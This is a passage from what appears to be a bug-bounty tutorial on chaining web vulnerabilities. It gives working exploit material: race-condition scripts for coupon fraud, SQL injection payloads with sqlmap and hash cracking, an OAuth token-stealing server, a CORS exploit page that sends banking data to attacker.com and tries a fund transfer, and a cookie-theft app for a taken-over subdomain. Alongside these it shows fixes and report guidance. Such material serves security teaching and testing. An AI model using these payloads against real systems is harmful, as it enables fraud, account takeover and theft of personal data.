  // BUG: This check and the usage insert are NOT atomic
  const alreadyUsed = await CouponUsage.findOne({
    where: { couponId: coupon.id, userId: userId }
  });
  if (alreadyUsed) return res.status(400).json({ error: 'Coupon already used' });
  
  // Step C: Apply coupon to cart
  // Race window: Between Step B and Step C, another concurrent request
  // can pass the same Step B check
  const cart = await Cart.findOne({ where: { userId: userId } });
  cart.discount += coupon.discountAmount;
  cart.total -= coupon.discountAmount;
  await cart.save();
  
  // Step D: Mark coupon as used
  await CouponUsage.create({ couponId: coupon.id, userId: userId });
  
  res.json({
    discount: cart.discount,
    total: cart.total,
    original_total: cart.total + cart.discount
  });
});
```

The race window is between Step B (checking if coupon was used) and Step D (marking it as used). If 20 requests arrive simultaneously, all 20 pass Step B before any of them reach Step D.

### Step 3: Exploit with Burp Suite Turbo Intruder

In Burp Suite:

1. Capture the coupon application request in Proxy
2. Send to **Turbo Intruder** (Burp Extension)
3. Use the following script:

```python
# Turbo Intruder script for race condition exploitation
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)
    
    # Queue the same request 50 times
    for i in range(50):
        engine.queue(target.req, gate='race')
    
    # Release all requests simultaneously
    engine.openGate('race')

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

Alternatively, use the **single-packet attack** technique (HTTP/2) for even tighter timing:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=50,
                           pipeline=False,
                           engine=Engine.HTTP2)
    
    for i in range(50):
        engine.queue(target.req, gate='race')
    
    engine.openGate('race')
```

### Step 4: Verify the Double-Spend

After sending 50 concurrent coupon applications, check the cart:

```http
GET /api/cart HTTP/1.1
Authorization: Bearer <user_token>
```

Response:

```json
{
  "items": [{"product_id": 42, "price": 100.00}],
  "original_total": 100.00,
  "discount": 250.00,
  "total": -150.00
}
```

The coupon was applied 5 times (5 x $50 = $250 discount on a $100 item), resulting in a negative total. If the application processes the checkout with a negative total, the "payment" credits the user's wallet instead of charging it.

```http
POST /api/checkout HTTP/1.1
Content-Type: application/json
Authorization: Bearer <user_token>

{"payment_method": "wallet"}
```

```json
{
  "order_id": 9876,
  "total_charged": -150.00,
  "wallet_balance": 150.00,
  "status": "completed"
}
```

The attacker now has $150 in wallet credit from a $0 investment.

### Fixed Version

```javascript
// Fixed with database-level locking
const { Sequelize } = require('sequelize');

app.post('/api/cart/apply-coupon', async (req, res) => {
  const { coupon_code } = req.body;
  const userId = req.user.id;
  
  // Use a database transaction with row-level locking
  const transaction = await sequelize.transaction({
    isolationLevel: Sequelize.Transaction.ISOLATION_LEVELS.SERIALIZABLE
  });
  
  try {
    // Lock the coupon row for update
    const coupon = await Coupon.findOne({
      where: { code: coupon_code, active: true },
      lock: transaction.LOCK.UPDATE,
      transaction
    });
    if (!coupon) {
      await transaction.rollback();
      return res.status(400).json({ error: 'Invalid coupon' });
    }
    
    // Atomic check-and-insert using unique constraint
    const [usage, created] = await CouponUsage.findOrCreate({
      where: { couponId: coupon.id, userId: userId },
      defaults: { couponId: coupon.id, userId: userId },
      transaction
    });
    
    if (!created) {
      await transaction.rollback();
      return res.status(400).json({ error: 'Coupon already used' });
    }
    
    // Apply discount
    const cart = await Cart.findOne({
      where: { userId: userId },
      lock: transaction.LOCK.UPDATE,
      transaction
    });
    
    cart.discount = Math.min(cart.discount + coupon.discountAmount, cart.total);
    cart.total = Math.max(0, cart.originalTotal - cart.discount); // Never negative
    await cart.save({ transaction });
    
    await transaction.commit();
    
    res.json({ discount: cart.discount, total: cart.total });
  } catch (error) {
    await transaction.rollback();
    res.status(500).json({ error: 'Failed to apply coupon' });
  }
});
```

### Impact

- **Individual race condition**: Medium -- can apply coupon multiple times
- **Chained with payment manipulation**: Critical -- financial fraud, unlimited wallet credit, direct monetary loss for the business

---

## Chain 7: SQL Injection + Admin Account Takeover -- Extracting Admin Password Hash

### The Scenario

A search endpoint on an application is vulnerable to SQL injection. The application uses bcrypt for password hashing. The attacker extracts the admin password hash via SQL injection, cracks it offline, and logs in as admin.

### Step 1: Discover SQL Injection

The search endpoint:

```http
GET /api/products/search?q=laptop&sort=price&order=asc HTTP/1.1
Host: app.target.com
Authorization: Bearer <user_token>
```

The `order` parameter is injectable (ORDER BY injection):

```http
GET /api/products/search?q=laptop&sort=price&order=asc,(SELECT+CASE+WHEN+(1=1)+THEN+1+ELSE+1/(SELECT+0)+END) HTTP/1.1
Host: app.target.com
```

Normal response (condition is true). Now test false condition:

```http
GET /api/products/search?q=laptop&sort=price&order=asc,(SELECT+CASE+WHEN+(1=2)+THEN+1+ELSE+1/(SELECT+0)+END) HTTP/1.1
Host: app.target.com
```

HTTP 500 error (division by zero). This confirms boolean-based blind SQL injection.

### Step 2: Extract Database Information

The vulnerable code (Node.js with raw SQL):

```javascript
// Vulnerable search endpoint
app.get('/api/products/search', async (req, res) => {
  const { q, sort, order } = req.query;
  
  // BUG: order parameter directly interpolated into SQL
  const query = `
    SELECT id, name, price, description 
    FROM products 
    WHERE name ILIKE '%${q}%' 
    ORDER BY ${sort} ${order}
  `;
  
  const result = await pool.query(query);
  res.json(result.rows);
});
```

Using `sqlmap` for automated extraction:

```bash
sqlmap -u "https://app.target.com/api/products/search?q=laptop&sort=price&order=asc" \
  -p order \
  --headers="Authorization: Bearer <user_token>" \
  --technique=B \
  --dbms=postgresql \
  --dbs

# Found databases: target_prod, postgres, template0, template1

sqlmap -u "https://app.target.com/api/products/search?q=laptop&sort=price&order=asc" \
  -p order \
  --headers="Authorization: Bearer <user_token>" \
  --technique=B \
  --dbms=postgresql \
  -D target_prod \
  --tables

# Found tables: users, products, orders, sessions, api_keys, ...

sqlmap -u "https://app.target.com/api/products/search?q=laptop&sort=price&order=asc" \
  -p order \
  --headers="Authorization: Bearer <user_token>" \
  --technique=B \
  --dbms=postgresql \
  -D target_prod \
  -T users \
  --columns

# Columns: id, email, password_hash, role, name, created_at, ...

sqlmap -u "https://app.target.com/api/products/search?q=laptop&sort=price&order=asc" \
  -p order \
  --headers="Authorization: Bearer <user_token>" \
  --technique=B \
  --dbms=postgresql \
  -D target_prod \
  -T users \
  -C email,password_hash,role \
  --where="role='admin'" \
  --dump
```

### Step 3: Manual Boolean-Based Extraction (Burp Intruder)

For manual extraction character by character:

```http
# Extract the first character of admin's password hash
GET /api/products/search?q=laptop&sort=price&order=asc,(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password_hash+FROM+users+WHERE+role='admin'+LIMIT+1),1,1)='$')+THEN+1+ELSE+1/(SELECT+0)+END) HTTP/1.1
```

In Burp Intruder, set up a cluster bomb attack:
- Position 1: Character position (1 to 60)
- Position 2: Character value (all printable ASCII)
- Filter by response code: 200 = correct character, 500 = wrong character

### Step 4: Crack the Hash

Extracted hash: `$2b$12$LJ3m5RXoMhP2aBk8CqFz9OuG1HjN8kXqZv7Y2mD4sEfWxTpK`

```bash
# Use hashcat for offline cracking
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Or John the Ripper
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

If the password is weak (e.g., `Admin@2026`), it will crack in minutes to hours depending on the bcrypt cost factor.

### Step 5: Login as Admin

```http
POST /api/auth/login HTTP/1.1
Host: app.target.com
Content-Type: application/json

{
  "email": "admin@target.com",
  "password": "Admin@2026"
}
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1,
    "email": "admin@target.com",
    "role": "admin"
  }
}
```

### Impact

- **Individual SQL injection (ORDER BY)**: Medium to High -- data extraction but limited to blind techniques
- **Chained with password cracking and admin login**: Critical -- full admin account takeover, access to all application data and administrative functions

---

## Chain 8: Open Redirect + OAuth Token Theft

### The Scenario

A target application uses OAuth 2.0 with Google for authentication. The application has an open redirect vulnerability on its login callback URL. The OAuth configuration does not strictly validate the `redirect_uri` parameter, allowing the attacker to steal the authorization code.

### Step 1: Discover the Open Redirect

The application has a redirect endpoint:

```http
GET /redirect?url=https://target.com/dashboard HTTP/1.1
Host: app.target.com
```

Test with an external domain:

```http
GET /redirect?url=https://attacker.com HTTP/1.1
Host: app.target.com
```

Response:

```
HTTP/1.1 302 Found
Location: https://attacker.com
```

Open redirect confirmed. On its own, this is Low severity at most programs.

### Step 2: Analyze the OAuth Flow

The application's OAuth login flow:

```
1. User clicks "Login with Google"
2. Browser redirects to:
   https://accounts.google.com/o/oauth2/v2/auth?
     client_id=123456.apps.googleusercontent.com&
     redirect_uri=https://app.target.com/auth/callback&
     response_type=code&
     scope=email profile&
     state=random_state_value

3. User authenticates with Google
4. Google redirects to:
   https://app.target.com/auth/callback?code=AUTHORIZATION_CODE&state=random_state_value

5. Server exchanges authorization code for access token
6. Server creates session and redirects to dashboard
```

### Step 3: Chain Open Redirect with OAuth

The key vulnerability: the application's OAuth configuration allows subdirectory paths on the redirect_uri, or the `state` parameter includes a post-login redirect URL that goes through the open redirect:

**Scenario A: Loose redirect_uri validation by the OAuth provider**

Some OAuth providers validate redirect_uri with prefix matching. If `https://app.target.com/auth/callback` is registered, some providers also accept `https://app.target.com/auth/callback/../redirect?url=https://attacker.com`:

```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=123456.apps.googleusercontent.com&
  redirect_uri=https://app.target.com/auth/callback/../redirect?url=https://attacker.com&
  response_type=code&
  scope=email+profile&
  state=random_state_value
```

**Scenario B: Post-login redirect parameter**

More commonly, the application itself has a `next` or `return_to` parameter in the OAuth state:

```http
# Normal login flow stores the return URL in the state
GET /auth/login?return_to=/dashboard HTTP/1.1
Host: app.target.com
```

The application encodes `return_to` into the OAuth state parameter. After the OAuth callback, the server redirects to the `return_to` URL:

```http
# After OAuth callback
GET /auth/callback?code=AUTH_CODE&state=eyJyZXR1cm5fdG8iOiIvZGFzaGJvYXJkIn0 HTTP/1.1
Host: app.target.com

# Server processes the code, creates a session, and redirects:
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=VALID_SESSION_TOKEN; HttpOnly; Secure
```

The attacker manipulates `return_to`:

```
https://app.target.com/auth/login?return_to=/redirect?url=https://attacker.com/steal
```

After the victim completes OAuth, the server redirects to `/redirect?url=https://attacker.com/steal`, which redirects to the attacker's server. The session cookie is now set, but the victim's browser also sends the `Referer` header to the attacker's server, which may contain the authorization code or session tokens.

### Step 4: Steal the Token

Attacker's server:

```python
# attacker_server.py
from flask import Flask, request
import logging

app = Flask(__name__)
logging.basicConfig(filename='stolen_tokens.log', level=logging.INFO)

@app.route('/steal')
def steal():
    # Capture the referer (may contain the auth code in the URL)
    referer = request.headers.get('Referer', 'none')
    
    # Capture any tokens in URL fragments (via JavaScript redirect)
    code = request.args.get('code', 'none')
    token = request.args.get('token', 'none')
    
    logging.info(f"Referer: {referer}, Code: {code}, Token: {token}")
    
    # Redirect victim to legitimate page to avoid suspicion
    return redirect("https://app.target.com/dashboard")

@app.route('/steal-fragment')
def steal_fragment():
    """For implicit flow where token is in URL fragment"""
    return '''
    <html><body>
    <script>
    // URL fragments (#access_token=...) are not sent to the server
    // but JavaScript can access them
    var hash = window.location.hash;
    if (hash) {
        new Image().src = "/collect?fragment=" + encodeURIComponent(hash);
    }
    </script>
    </body></html>
    '''

@app.route('/collect')
def collect():
    fragment = request.args.get('fragment', '')
    logging.info(f"Fragment: {fragment}")
    return 'OK'

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```

### The Full Attack URL

Craft a phishing link to send to the victim:

```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=123456.apps.googleusercontent.com&
  redirect_uri=https://app.target.com/auth/callback&
  response_type=code&
  scope=email+profile&
  state=BASE64({"return_to":"/redirect?url=https://attacker.com/steal"})
```

The victim sees a legitimate Google login prompt for a legitimate application. After authenticating, their authorization code or session is stolen through the redirect chain.

### Impact

- **Individual open redirect**: Low (Informational at many programs)
- **Chained with OAuth flow**: High to Critical -- account takeover via stolen OAuth authorization code or session token

---

## Chain 9: CORS Misconfiguration + API Data Theft

### The Scenario

A banking application has a CORS misconfiguration that reflects the `Origin` header in `Access-Control-Allow-Origin`. The application's API returns sensitive financial data. An attacker hosts a malicious page that exploits the CORS misconfiguration to steal the victim's banking data when they visit it.

### Step 1: Discover the CORS Misconfiguration

```http
GET /api/account/balance HTTP/1.1
Host: api.bank-target.com
Origin: https://evil.com
Cookie: session=VALID_SESSION
```

Response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "accounts": [
    {"id": "ACC001", "type": "checking", "balance": 45230.50},
    {"id": "ACC002", "type": "savings", "balance": 128750.00}
  ]
}
```

The server reflects `https://evil.com` in `Access-Control-Allow-Origin` and includes `Access-Control-Allow-Credentials: true`. This means any website can make authenticated cross-origin requests and read the responses.

### Step 2: Test CORS Behavior Thoroughly

```http
# Test with null origin
GET /api/account/balance HTTP/1.1
Host: api.bank-target.com
Origin: null
Cookie: session=VALID_SESSION

# Test with subdomain
GET /api/account/balance HTTP/1.1
Host: api.bank-target.com
Origin: https://anything.bank-target.com
Cookie: session=VALID_SESSION

# Test with the target domain suffixed
GET /api/account/balance HTTP/1.1
Host: api.bank-target.com
Origin: https://evil-bank-target.com
Cookie: session=VALID_SESSION
```

The vulnerable server code:

```javascript
// Vulnerable CORS configuration (Node.js/Express)
app.use((req, res, next) => {
  // BUG: Reflects any origin
  const origin = req.headers.origin;
  res.header('Access-Control-Allow-Origin', origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
```

### Step 3: Build the Exploit Page

```html
<!-- https://attacker.com/cors-exploit.html -->
<!DOCTYPE html>
<html>
<head><title>You've won a prize!</title></head>
<body>
<h1>Congratulations! Processing your reward...</h1>
<script>
// Step A: Steal account balances
fetch('https://api.bank-target.com/api/account/balance', {
  credentials: 'include'  // Send cookies cross-origin
})
.then(response => response.json())
.then(data => {
  console.log('Stolen account data:', data);
  
  // Step B: Steal transaction history
  return fetch('https://api.bank-target.com/api/account/transactions?limit=100', {
    credentials: 'include'
  });
})
.then(response => response.json())
.then(transactions => {
  console.log('Stolen transactions:', transactions);
  
  // Step C: Steal personal information
  return fetch('https://api.bank-target.com/api/profile', {
    credentials: 'include'
  });
})
.then(response => response.json())
.then(profile => {
  console.log('Stolen profile:', profile);
  
  // Step D: Exfiltrate everything to attacker's server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      profile: profile,
      accounts: window.stolenAccounts,
      transactions: window.stolenTransactions
    })
  });
})
.catch(err => console.error(err));

// Step E: Attempt to initiate a transfer (if the CORS allows POST with credentials)
fetch('https://api.bank-target.com/api/transfers', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    from_account: 'ACC001',
    to_account: 'ATTACKER_EXTERNAL_ACCOUNT',
    amount: 1000.00,
    currency: 'USD'
  })
})
.then(response => response.json())
.then(result => {
  console.log('Transfer result:', result);
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({ transfer: result })
  });
});
</script>
</body>
</html>
```

### Step 4: Deliver the Exploit

The attacker sends the victim a link to `https://attacker.com/cors-exploit.html` via:
- Phishing email
- Social engineering message
- Injected into another site the victim visits (via ad network or compromised site)
- Posted in a forum the victim frequents

When the victim visits the page while logged into the banking application, their browser makes authenticated requests to the bank's API and the attacker's JavaScript reads the responses.

### Fixed CORS Configuration

```javascript
// Fixed: Explicit allowlist
const allowedOrigins = [
  'https://app.bank-target.com',
  'https://mobile.bank-target.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }
  // If origin is not in the allowlist, no CORS headers are sent
  // and the browser blocks the cross-origin request
  next();
});
```

### Impact

- **Individual CORS misconfiguration**: Medium -- allows cross-origin data reading
- **Chained with credential-inclusive requests to sensitive APIs**: Critical -- theft of financial data, personal information, potential unauthorized fund transfers

---

## Chain 10: Subdomain Takeover + Cookie Theft

### The Scenario

A target company has a CNAME record pointing `old-blog.target.com` to a decommissioned Heroku app. The subdomain is vulnerable to takeover. The target application at `app.target.com` sets cookies on the parent domain `.target.com`. After taking over the subdomain, the attacker can steal session cookies.

### Step 1: Discover the Dangling CNAME

```bash
# DNS enumeration
subfinder -d target.com -o subdomains.txt
cat subdomains.txt | httpx -status-code -title -tech-detect -o live_subdomains.txt

# Check for dangling CNAMEs
dig old-blog.target.com CNAME
# old-blog.target.com.  300  IN  CNAME  target-old-blog.herokuapp.com.

# Verify the Heroku app doesn't exist
curl -v https://old-blog.target.com
# "No such app" or Heroku 404 page
```

Alternatively, use specialized tools:

```bash
# Can-I-Take-Over-XYZ methodology
subjack -w subdomains.txt -t 100 -timeout 30 -o takeover_candidates.txt -ssl
```

### Step 2: Claim the Subdomain

```bash
# Create a Heroku app with the matching name
heroku create target-old-blog

# Add the custom domain
heroku domains:add old-blog.target.com --app target-old-blog

# Deploy the exploit application
cd exploit-app
git push heroku main
```

The exploit application deployed on the taken-over subdomain:

```javascript
// server.js (deployed to Heroku as target-old-blog)
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  // Read cookies set on .target.com domain
  const cookies = req.headers.cookie || 'none';
  
  console.log(`[COOKIE THEFT] IP: ${req.ip}, Cookies: ${cookies}`);
  
  // Log to attacker's database or external service
  
  // Serve a page that also uses JavaScript to read cookies
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Target Blog</title></head>
    <body>
    <h1>Blog content loading...</h1>
    <script>
    // Read all cookies accessible to this subdomain
    const cookies = document.cookie;
    
    // Send to collection endpoint
    fetch('/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        cookies: cookies,
        localStorage: JSON.stringify(localStorage),
        url: window.location.href,
        referrer: document.referrer
      })
    });
    
    // Also try to set a malicious cookie on .target.com
    // This can overwrite the legitimate session cookie
    document.cookie = "session=ATTACKER_CONTROLLED_VALUE; domain=.target.com; path=/; secure";
    </script>
    </body>
    </html>
  `);
});

app.post('/collect', express.json(), (req, res) => {
  console.log('[EXFILTRATED]', req.body);
  // Forward to attacker's collection server
  res.json({ status: 'ok' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT);
```

### Step 3: Analyze the Cookie Scope

The target application sets cookies like this:

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJI...; Domain=.target.com; Path=/; HttpOnly; Secure; SameSite=Lax
Set-Cookie: preferences=theme:dark; Domain=.target.com; Path=/
```

The `Domain=.target.com` scope means these cookies are sent to ALL subdomains of `target.com`, including our taken-over `old-blog.target.com`.

The `HttpOnly` flag on the session cookie prevents JavaScript from reading it, but the cookie is still sent in HTTP requests to our controlled subdomain. Our server-side code captures it from the request headers.

The `preferences` cookie lacks `HttpOnly`, so our JavaScript can read it directly.

### Step 4: Session Hijacking

With the stolen session cookie, the attacker can impersonate the victim:

```http
GET /api/me HTTP/1.1
Host: app.target.com
Cookie: session=eyJhbGciOiJI...STOLEN_SESSION_VALUE
```

### Additional Attack: Cookie Tossing

Even if the session cookie has `HttpOnly`, the attacker can perform a cookie tossing attack -- setting a new cookie from the subdomain that shadows the legitimate one:

```javascript
// Set a cookie from old-blog.target.com that overrides the session on app.target.com
document.cookie = "session=ATTACKER_VALUE; domain=.target.com; path=/; secure";
```

The next time the victim visits `app.target.com`, the browser may send the attacker's cookie instead of the legitimate session cookie. This can be used for:
- **Session fixation**: Force the victim into a session the attacker controls
- **Denial of service**: Invalidate the victim's session
- **CSRF token bypass**: If CSRF tokens are tied to sessions, controlling the session enables CSRF

### Impact

- **Individual subdomain takeover**: Medium -- control of an unused subdomain
- **Chained with cookie theft**: Critical -- session hijacking for all users who visit the taken-over subdomain or whose cookies scope to the parent domain. Mass account compromise if the subdomain is linked from the main site or appears in search results.

---

## Impact Assessment for Chained Vulnerabilities

### Severity Escalation Matrix

| Chain | Bug A (Severity) | Bug B (Severity) | Chained (Severity) |
|-------|-----------------|-----------------|-------------------|
| 1 | IDOR (Medium) | JWT alg confusion (Medium) | Admin takeover (Critical) |
| 2 | SSRF (High) | AWS metadata access (High) | Infrastructure compromise (Critical) |
| 3 | Stored XSS (Medium-High) | CSRF bypass (Medium) | Automated account takeover (Critical) |
| 4 | File upload bypass (Medium) | Path traversal (Medium) | Remote code execution (Critical) |
| 5 | .git exposure (Medium) | Credential reuse (N/A) | Database compromise (Critical) |
| 6 | Race condition (Medium) | Payment logic flaw (Medium) | Financial fraud (Critical) |
| 7 | SQL injection (High) | Weak password (Low) | Admin takeover (Critical) |
| 8 | Open redirect (Low) | OAuth flow manipulation (Medium) | Account takeover (High-Critical) |
| 9 | CORS misconfiguration (Medium) | Sensitive API endpoints (N/A) | Financial data theft (Critical) |
| 10 | Subdomain takeover (Medium) | Cookie scoping (Low) | Mass session hijacking (Critical) |

The pattern is clear: individually modest vulnerabilities combine to produce Critical-severity outcomes. The chain is always more dangerous than the sum of its parts.

### CVSS Scoring for Chains

When scoring a chained vulnerability, you should score the final impact of the complete chain, not the individual components:

- **Attack Vector**: Usually Network (AV:N) -- the chain is exploitable remotely
- **Attack Complexity**: Consider the complexity of the full chain. Multi-step chains may be AC:H, but if each step is reliable, AC:L
- **Privileges Required**: Based on the initial entry point. If the first bug requires authentication, PR:L
- **User Interaction**: If any step requires victim interaction (XSS, phishing), UI:R
- **Scope**: If the chain crosses security boundaries (e.g., from web app to AWS infrastructure), S:C
- **Confidentiality/Integrity/Availability**: Based on the final impact

Example for Chain 2 (SSRF + AWS metadata):
- AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:H / A:H = CVSS 9.9

---

## How to Write Bug Bounty Reports for Chained Bugs

### Report Structure for Chains

```
Title: [Final Impact] via [Bug A] + [Bug B] Chain

Example: Full Admin Account Takeover via IDOR User Enumeration + JWT Algorithm Confusion

Severity: Critical (CVSS 9.8)

Summary:
A chain of two vulnerabilities allows an unauthenticated attacker to gain 
full admin access to the application. First, an IDOR on /api/users/:id 
leaks admin user details including role information. Second, a JWT algorithm 
confusion vulnerability allows forging tokens with arbitrary claims. Combined, 
an attacker can forge an admin JWT and access all administrative functions.

Vulnerability Chain:
  Step 1: [Bug A description with specific endpoint and evidence]
  Step 2: [How Bug A output feeds into Bug B]
  Step 3: [Bug B exploitation using data from Bug A]
  Step 4: [Final impact demonstration]

Steps to Reproduce:
  [Detailed numbered steps with exact HTTP requests for each step]
  [Each step should clearly show the output that feeds the next step]

Impact:
  [Describe the final impact of the complete chain]
  [Include data sensitivity, user count affected, financial impact]

Remediation:
  [Fix for Bug A]
  [Fix for Bug B]
  [Defense-in-depth recommendations]
```

### Key Principles for Chain Reports

1. **Lead with the impact**: The title and first paragraph should describe what the chain achieves, not the individual bugs. "Full Admin Account Takeover" not "IDOR + JWT Issue."

2. **Make the chain reproducible**: Each step must include the exact HTTP request and the exact output that feeds the next step. A reviewer should be able to follow your steps mechanically.

3. **Explain the dependency**: Clearly articulate why Bug A is necessary for Bug B. "Without the role information from the IDOR, the attacker would not know what role value to put in the forged JWT."

4. **Score the chain, not the components**: Your severity rating should reflect the final impact. If the chain achieves RCE, it is Critical regardless of the individual bug severities.

5. **Provide fixes for every link**: Recommend fixes for each individual vulnerability. Breaking any single link in the chain should prevent the full attack.

6. **Include a PoC script**: A single script that demonstrates the entire chain end-to-end is the most convincing evidence. The triage team should be able to run it and see the result.

### Common Mistakes in Chain Reports

- **Submitting individual bugs separately**: If two bugs only reach Critical when chained, submit them as one report. Submitting separately risks both being marked as Medium with no escalation.
- **Handwaving the chain**: "An attacker could potentially use this to..." is not a chain report. Show the exact steps.
- **Assuming the chain is obvious**: The triage team may not see the connection. Spell out every step explicitly.
- **Over-chaining**: Adding unnecessary steps to pad the report weakens it. Only include steps that are required for the final impact.

---

## Severity Escalation Through Chaining

### Why Individual Bugs Get Downgraded

Programs frequently downgrade individual findings:

- **IDOR leaking emails**: "This is just public profile information" -- Informational
- **Open redirect**: "We accept the risk, no direct impact" -- Informational/Low
- **CORS reflecting arbitrary origin**: "Our API doesn't return sensitive data on this endpoint" -- Low
- **Subdomain takeover (no cookies)**: "This subdomain is not used" -- Low
- **Self-XSS**: "Requires the victim to paste payload in their own browser" -- Informational

### How Chaining Prevents Downgrades

When you chain these individually dismissible bugs into a demonstrated attack path with real impact, the program cannot dismiss them. You are not arguing about theoretical risk -- you are showing them the exploitation.

The key phrase in your report: **"I have demonstrated that..."**

Not "an attacker could potentially..." but "I have demonstrated that an unauthenticated attacker can access all 2.8 million user records by chaining the following three vulnerabilities."

### Building Your Chaining Methodology

1. **Maintain an asset inventory**: For each target, keep a running list of every finding, even "not a bug" ones. Low-severity bugs from six months ago might be the missing link in tomorrow's chain.

2. **Think in attack graphs**: Every finding is a node. Every data flow between findings is an edge. Map out what each bug gives you (information, access, capability) and what each bug needs as input.

3. **Categorize your findings by type**:
   - **Information**: User data, credentials, source code, internal architecture
   - **Access**: Network access, authenticated sessions, elevated privileges
   - **Capability**: Code execution, file writes, DNS control, request forgery

4. **Look for connector patterns**:
   - Information finding + access-requiring vulnerability = chain
   - Access finding + higher-privilege-requiring vulnerability = chain
   - Client-side bug + server-side bug = chain
   - External finding + internal-network-requiring vulnerability = chain

---

## Lab Setup: Practicing Vulnerability Chains

### Docker Compose Environment for Chain Practice

```yaml
# docker-compose.yml -- Vulnerable lab for practicing chains
version: '3.8'

services:
  # Main web application (Node.js/Express)
  web-app:
    build:
      context: ./web-app
      dockerfile: Dockerfile
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgresql://app:app_password@postgres:5432/vulnerable_app
      - JWT_SECRET=lab-secret-key-for-testing
      - REDIS_URL=redis://redis:6379
      - AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
      - NODE_ENV=development
    depends_on:
      - postgres
      - redis
    volumes:
      - ./web-app:/app  # Exposes .git
    networks:
      - app-network

  # API service (FastAPI)
  api-service:
    build:
      context: ./api-service
      dockerfile: Dockerfile
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://api:api_password@postgres:5432/vulnerable_app
      - DEBUG=true
    depends_on:
      - postgres
    networks:
      - app-network

  # PostgreSQL database
  postgres:
    image: postgres:16
    environment:
      - POSTGRES_DB=vulnerable_app
      - POSTGRES_USER=admin
      - POSTGRES_PASSWORD=admin_password
    ports:
      - "5432:5432"
    volumes:
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - app-network

  # Redis (for sessions and caching)
  redis:
    image: redis:7
    ports:
      - "6379:6379"
    networks:
      - app-network

  # Internal metadata service (simulating AWS metadata)
  metadata-service:
    build:
      context: ./metadata-mock
      dockerfile: Dockerfile
    networks:
      app-network:
        ipv4_address: 169.254.169.254  # Simulated metadata IP
    
networks:
  app-network:
    driver: bridge
    ipam:
      config:
        - subnet: 169.254.169.0/24
```

### Practice Chains in This Lab

1. **SSRF + Metadata**: Use the link preview feature to hit the metadata service and extract fake AWS credentials
2. **IDOR + JWT**: Enumerate users via IDOR, then forge admin tokens
3. **SQL Injection + Data Extraction**: Find the injectable search endpoint, extract the users table
4. **File Upload + Path Traversal**: Upload a file that breaks out of the uploads directory
5. **Source Code Disclosure + Credential Reuse**: Access the exposed `.git` directory, find database credentials, connect directly to PostgreSQL

---

## Conclusion

Vulnerability chaining is the highest skill in offensive security. It separates the automated scanner operator from the security researcher. It transforms a collection of "informational" and "low" findings into Critical-severity attack paths that demonstrate real-world impact.

The ten chains in this article are not exotic edge cases. They are patterns that repeat across every bug bounty program, every penetration test, and every real-world breach. IDOR plus JWT manipulation. SSRF plus cloud metadata. XSS plus CSRF. File upload plus path traversal. These chains appear because applications are built from layers, and weaknesses in multiple layers compound.

Your methodology should be:

1. **Find everything**: Do not dismiss low-severity bugs. Document every finding, every anomaly, every piece of leaked information.
2. **Map the attack graph**: For each finding, ask: "What does this give me? What does this enable? What other bug would become more dangerous if I had this?"
3. **Chain deliberately**: Connect your findings into reproducible attack paths. Test each step. Document every HTTP request.
4. **Report the chain**: Lead with impact, show every step, provide a PoC script, and fix recommendations for every link.

The best bug bounty reports are not reports of single vulnerabilities. They are stories of how an attacker moves from the outside of a system to full compromise, one chained vulnerability at a time.

---

**Previous in the series:** [Part 14: Internal Logs, Debug Endpoints, and Source Code Disclosure](/security-deep-dive-part-14) -- the recon techniques that feed into many of the chains described here.

**Recommended tools:** Burp Suite Professional (with Turbo Intruder), sqlmap, git-dumper, ffuf, subfinder, httpx, nuclei, custom Python scripts for PoC automation.
